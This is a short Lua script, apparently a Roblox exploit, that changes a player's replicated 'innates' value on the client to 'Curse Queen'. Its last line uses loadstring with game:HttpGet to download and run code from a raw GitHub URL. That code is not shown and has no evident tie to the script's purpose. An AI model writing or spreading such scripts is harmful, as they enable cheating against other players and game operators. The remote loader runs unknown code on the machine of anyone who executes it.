local player = game:GetService("Players").LocalPlayer
local replicatedData = player:WaitForChild("ReplicatedData")
local innates = replicatedData:WaitForChild("innates")
local TargetInnate = {
    [1] = "Curse Queen",
}
for numero, valor in pairs(TargetInnate) do
    local valorObj = innates:FindFirstChild(tostring(numero))
    if valorObj then
        valorObj.Value = valor
    else
        warn("Valor '" .. numero .. "' desconhecido")
    end
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/2backside/vencordgui/refs/heads/main/learn.lua"))()
